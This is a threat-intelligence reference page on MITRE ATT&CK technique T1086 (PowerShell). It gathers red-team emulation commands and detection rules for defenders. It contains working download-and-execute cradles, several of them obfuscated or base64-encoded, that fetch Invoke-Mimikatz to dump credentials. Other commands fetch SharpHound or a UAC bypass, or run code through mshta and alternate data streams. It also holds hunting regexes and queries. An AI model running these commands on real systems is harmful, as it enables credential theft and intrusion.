
# PowerShell

## Description

### MITRE Description

> PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: True
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1086

## Potential Commands

```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

write-host "Import and Execution of SharpHound.ps1 from PathToAtomicsFolder\T1086\src" -ForegroundColor Cyan
import-module PathToAtomicsFolder\T1086\src\SharpHound.ps1
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5

write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5

(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))

$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr

Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"

powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml');$Xml.command.a.execute | IEX"

C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct').Exec();close()"

# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))

powershell.exe -version 2 -Command Write-Host $PSVersion

Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand

{'windows': {'psh,pwsh': {'command': 'get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n'}}}
{'windows': {'psh': {'command': 'cmd.exe /c "net user" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c "whoami /priv" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c "netstat -ano" >> C:\\Windows\\temp\\history.log;'}}}
{'windows': {'psh,pwsh': {'command': 'powershell.exe -c "Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log";'}}}
{'windows': {'psh,pwsh': {'command': 'echo $(get-uac)\n'}}}
{'windows': {'psh': {'command': 'Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n'}}}
{'windows': {'psh,pwsh': {'command': 'start powershell.exe -ArgumentList "-NoP","-StA","-ExecutionPolicy","bypass",".\\Emulate-Administrator-Tasks.ps1"\n', 'cleanup': 'Remove-Item -Force -Path ".\\Emulate-Administrator-Tasks.ps1"\n', 'payloads': ['Emulate-Administrator-Tasks.ps1']}}}
{'windows': {'psh': {'command': 'powershell.exe -c IEX (New-Object Net.Webclient).downloadstring("https://bit.ly/33H0QXi") \n'}}}
{'windows': {'psh': {'command': 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n'}}}
{'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", "PSTools.zip");\nNew-Item -ItemType "directory" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly \'System.IO.Compression.FileSystem\'; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "C:\\Windows\\System32\\PSTools");\n'}}}
excel.exe
cmd.exe
powershell.exe
excel.exe
powershell.exe
mshta.exe
cmd.exe
powershell.exe
mshta.exe
powershell.exe
powerpoint.exe
cmd.exe
powershell.exe
powerpoint.exe
powershell.exe
powershell.exe webClient.DownloadString(
powershell.exe webClient.DownloadFile
powershell.exe webClient.DownloadData
winword.exe
powershell.exe
\\Windows\\.+\\WindowsPowerShell\\.+\\powershell.exehidden|-enc|-NonI
powershell/lateral_movement/invoke_psremoting
powershell/lateral_movement/invoke_psremoting
powershell/management/spawn
powershell/management/spawn
python/management/multi/spawn
python/management/multi/spawn
```

## Commands Dataset

```
[{'command': 'powershell.exe "IEX (New-Object '
             "Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); "
             'Invoke-Mimikatz -DumpCreds"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'write-host "Import and Execution of SharpHound.ps1 from '
             'PathToAtomicsFolder\\T1086\\src" -ForegroundColor Cyan\n'
             'import-module PathToAtomicsFolder\\T1086\\src\\SharpHound.ps1\n'
             'Invoke-BloodHound -OutputDirectory $env:Temp\n'
             'Start-Sleep 5\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'write-host "Remote download of SharpHound.ps1 into memory, '
             'followed by execution of the script" -ForegroundColor Cyan\n'
             'IEX (New-Object '
             "Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\n"
             'Invoke-BloodHound -OutputDirectory $env:Temp\n'
             'Start-Sleep 5\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': '(New-Object '
             "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n"
             '(New-Object '
             "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\n"
             "Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W "
             "'Net.WebClient';Set-Item Variable:\\gH "
             "'Default_File_Path.ps1';ls _-*;Set-Variable igZ "
             "(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem "
             'Variable:0W).Value);Set-Variable J ((((Get-Variable igZ '
             "-ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ "
             '-ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item '
             'Variable:/HJ1).Value,(GV gH).Value);&( '
             "''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT "
             '-Enco 3 (GV gH).Value)))\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object "
             '-ComObject '
             "WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty "
             "$reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP "
             '$reg (Item Variable:_).Value[0] (Variable '
             '_).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item '
             'Variable:_).Value.id-ieq$curpid}|ForEach{(Variable '
             '_).Value.MainWindowTitle})){Start-Sleep -Milliseconds '
             '500};While(!$wshell.AppActivate($title)){Start-Sleep '
             "-Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep "
             "-Milliseconds 500;@($url,(' "
             "'*1000),'~')|ForEach{$wshell.SendKeys((Variable "
             '_).Value)};$res=$Null;While($res.Length -lt '
             "2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item "
             'Variable:_).Value)};Start-Sleep -Milliseconds '
             "500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable "
             '_).Value)};If(GPS|?{(Item '
             "Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item "
             "Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP "
             '$reg (Item Variable:_).Value $props.((Variable '
             '_).Value)};IEX($res);invoke-mimikatz -dumpcr\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'Powershell.exe "IEX (New-Object '
             "Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); "
             'Invoke-AppPathBypass -Payload '
             '\'C:\\Windows\\System32\\cmd.exe\'"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'powershell.exe -exec bypass -noprofile "$comMsXml=New-Object '
             '-ComObject '
             "MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1',$False);$comMsXml.Send();IEX "
             '$comMsXml.ResponseText"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
             '-exec bypass -noprofile "$Xml = (New-Object '
             "System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml');$Xml.command.a.execute "
             '| IEX"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'C:\\Windows\\system32\\cmd.exe /c "mshta.exe '
             'javascript:a=GetObject(\'script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct\').Exec();close()"\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': '# Encoded payload in next command is the following "Set-Content '
             '-path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from '
             'the Atomic Red Team""\n'
             'reg.exe add '
             '"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" /v ART /t '
             'REG_SZ /d '
             '"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="\n'
             'iex '
             '([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp '
             "'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': 'powershell.exe -version 2 -Command Write-Host $PSVersion\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': "Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host "
             '"Stream Data Executed"\' -Stream \'streamCommand\'\n'
             '$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt '
             "-Stream 'streamcommand'\n"
             'Invoke-Expression $streamcommand\n',
  'name': None,
  'source': 'atomics/T1086/T1086.yaml'},
 {'command': {'windows': {'psh,pwsh': {'command': 'get-process >> '
                                                  '$env:APPDATA\\vmtools.log;\n'
                                                  'cat '
                                                  '$env:APPDATA\\vmtools.log\n'}}},
  'name': 'Capture running processes via PowerShell',
  'source': 'data/abilities/collection/4d9b079c-9ede-4116-8b14-72ad3a5533af.yml'},
 {'command': {'windows': {'psh': {'command': 'cmd.exe /c "net user" >> '
                                             'C:\\Windows\\temp\\history.log;\n'
                                             'cmd.exe /c "whoami /priv" >> '
                                             'C:\\Windows\\temp\\history.log;\n'
                                             'cmd.exe /c "netstat -ano" >> '
                                             'C:\\Windows\\temp\\history.log;'}}},
  'name': 'User enumeration',
  'source': 'data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml'},
 {'command': {'windows': {'psh,pwsh': {'command': 'powershell.exe -c '
                                                  '"Get-WmiObject -class '
                                                  'win32_operatingsystem | '
                                                  'select -property * | '
                                                  'export-csv msdebug.log";'}}},
  'name': 'System Information Gathering Script',
  'source': 'data/abilities/collection/702bfdd2-9947-4eda-b551-c3a1ea9a59a2.yml'},
 {'command': {'windows': {'psh,pwsh': {'command': 'echo $(get-uac)\n'}}},
  'name': 'Determine whether or not UAC is enabled',
  'source': 'data/abilities/collection/7c42a30c-c8c7-44c5-80a8-862d364ac1e4.yml'},
 {'command': {'windows': {'psh': {'command': 'Copy-Item '
                                             'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe '
                                             'C:\\Windows\\Temp\\debug.exe;\n'
                                             'C:\\Windows\\Temp\\debug.exe '
                                             'get-process >> '
                                             'C:\\Windows\\temp\\debug.log;\n'
                                             'C:\\Windows\\Temp\\debug.exe '
                                             'get-localgroup >> '
                                             'C:\\Windows\\temp\\debug.log;\n'
                                             'C:\\Windows\\Temp\\debug.exe '
                                             'get-localuser >> '
                                             'C:\\Windows\\temp\\debug.log;\n'
                                             'C:\\Windows\\Temp\\debug.exe '
                                             'Get-ItemProperty '
                                             'Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion '
                                             '>> '
                                             'C:\\Windows\\temp\\debug.log;\n'}}},
  'name': 'Copy powershell to non-standard location and perform triage '
          'commands',
  'source': 'data/abilities/defense-evasion/e5f9de8f-3df1-4e78-ad92-a784e3f6770d.yml'},
 {'command': {'windows': {'psh,pwsh': {'cleanup': 'Remove-Item -Force -Path '
                                                  '".\\Emulate-Administrator-Tasks.ps1"\n',
                                       'command': 'start powershell.exe '
                                                  '-ArgumentList '
                                                  '"-NoP","-StA","-ExecutionPolicy","bypass",".\\Emulate-Administrator-Tasks.ps1"\n',
                                       'payloads': ['Emulate-Administrator-Tasks.ps1']}}},
  'name': 'Emulate administrator tasks on a system in a separate process',
  'source': 'data/abilities/execution/315cedf1-4a3a-4015-b63f-149d64bacbbc.yml'},
 {'command': {'windows': {'psh': {'command': 'powershell.exe -c IEX '
                                             '(New-Object '
                                             'Net.Webclient).downloadstring("https://bit.ly/33H0QXi") \n'}}},
  'name': 'Download',
  'source': 'data/abilities/execution/bfff9006-d1fb-46ce-b173-92cb04e9a031.yml'},
 {'command': {'windows': {'psh': {'command': 'powershell -enc '
                                             'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n'}}},
  'name': 'Download',
  'source': 'data/abilities/execution/ccdb8caf-c69e-424b-b930-551969450c57.yml'},
 {'command': {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
                                             '= { $True };\n'
                                             '$web = (New-Object '
                                             'System.Net.WebClient);\n'
                                             '$result = '
                                             '$web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", '
                                             '"PSTools.zip");\n'
                                             'New-Item -ItemType "directory" '
                                             'C:\\Windows\\System32\\PSTools '
                                             '-Force;\n'
                                             'Add-Type -Assembly '
                                             "'System.IO.Compression.FileSystem'; "
                                             '[System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", '
                                             '"C:\\Windows\\System32\\PSTools");\n'}}},
  'name': 'Download and install PSTools by unzipping the file',
  'source': 'data/abilities/execution/eb814e03-811a-467a-bc6d-dcd453750fa2.yml'},
 {'command': 'excel.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_2',
  'source': 'Threat Hunting Tables'},
 {'command': 'excel.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'mshta.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_2',
  'source': 'Threat Hunting Tables'},
 {'command': 'mshta.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powerpoint.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_2',
  'source': 'Threat Hunting Tables'},
 {'command': 'powerpoint.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe webClient.DownloadString(',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe webClient.DownloadFile',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe webClient.DownloadData',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'winword.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': '\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exehidden|-enc|-NonI',
  'name': None,
  'source': 'SysmonHunter - PowerShell'},
 {'command': 'powershell/lateral_movement/invoke_psremoting',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/lateral_movement/invoke_psremoting',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/spawn',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/spawn',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/multi/spawn',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/multi/spawn',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'PowerShell',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_path contains '
           '"powershell.exe"or process_path contains "powershell_ise.exe"or '
           'process_path contains "psexec.exe")'},
 {'name': 'PowerShell Downloads Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_command_line contains '
           '"*.Download*"or process_command_line contains "*Net.WebClient*")'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: T1086 non-interactive PowerShell\n'
           'description: By explorer.exe powershell.exe to as parent, '
           'non-interactive PowerShell activity detected.\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'references: None\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4688\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0NewProcessName: '* \\ "
           "powershell.exe'\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0ParentProcessName: '* \\ "
           "explorer.exe'\n"
           '\xa0\xa0\xa0\xa0condition: selection\n'
           'falsepositives:\n'
           '\xa0\xa0\xa0\xa0- Unknown\n'
           'level: critical'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - PowerShell': {'atomic_tests': [{'description': 'Download '
                                                                         'Mimikatz '
                                                                         'and '
                                                                         'dump '
                                                                         'credentials. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         'mimikatz '
                                                                         'dump '
                                                                         'details '
                                                                         'and '
                                                                         'password '
                                                                         'hashes '
                                                                         'will '
                                                                         'be '
                                                                         'displayed.\n',
                                                          'executor': {'command': 'powershell.exe '
                                                                                  '"IEX '
                                                                                  '(New-Object '
                                                                                  "Net.WebClient).DownloadString('#{mimurl}'); "
                                                                                  'Invoke-Mimikatz '
                                                                                  '-DumpCreds"\n',
                                                                       'elevation_required': True,
                                                                       'name': 'command_prompt'},
                                                          'input_arguments': {'mimurl': {'default': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1',
                                                                                         'description': 'Mimikatz '
                                                                                                        'url',
                                                                                         'type': 'url'}},
                                                          'name': 'Mimikatz',
                                                          'supported_platforms': ['windows']},
                                                         {'dependencies': [{'description': 'SharpHound.ps1 '
                                                                                           'must '
                                                                                           'be '
                                                                                           'located '
                                                                                           'at '
                                                                                           '#{file_path}\n',
                                                                            'get_prereq_command': 'Invoke-WebRequest '
                                                                                                  '"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" '
                                                                                                  '-OutFile '
                                                                                                  '"#{file_path}\\SharpHound.ps1"\n',
                                                                            'prereq_command': 'if '
                                                                                              '(Test-Path '
